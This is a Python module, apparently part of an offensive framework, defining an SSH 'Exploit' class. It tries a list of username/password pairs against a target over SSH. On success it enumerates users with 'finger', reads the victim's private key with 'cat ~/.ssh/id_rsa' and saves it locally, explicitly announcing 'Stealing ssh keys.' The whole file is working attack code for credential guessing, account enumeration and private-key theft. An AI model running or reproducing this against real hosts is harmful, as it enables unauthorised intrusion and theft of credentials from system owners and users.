from hydra import Exploit
from io import StringIO 
import sys, paramiko, getpass

class SSH(Exploit):
    def __init__(self):
        self.name = 'ssh'
        self.port = 22
    
    def get_usernames(self, ssh):
        ssh.invoke_shell()
        stdin, stdout, stderr = ssh.exec_command('finger')
        stdin.close()
        stdout.readline()

        usernames = []
        for line in stdout:
            toks = line.split(' ')
            loot = (toks[0], None)
            if loot not in usernames:
                usernames.append(loot)
        print("Usernames found: ")
        print(usernames)
        return usernames
    
    def get_sshkeys(self, ssh, ip_address, username):
        try:
            stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa')
        except:
            print("No SSH keys found.")
        else:
            keys_bytes = stdout.read()
            keys = keys_bytes.decode(encoding='UTF-8')
            with open(f"../data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
                text_file.write(keys)
        finally:
            stdin.close()

    def getloot(self, ip_address, credentials):
        # try to log into ssh using credentials
        for c in credentials:
            print(f"Trying to SSH into IP address {ip_address} with:\n Username: {c[0]} and Password {c[1]}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip_address, username=c[0], password=c[1])
            except:
                print('Authentification failed.')
                ssh.close()
            else:
                print('Success. Gathering all usernames.')
                usernames = self.get_usernames(ssh)
                
                print('Stealing ssh keys.')
                self.get_sshkeys(ssh, ip_address, c[0])
                return usernames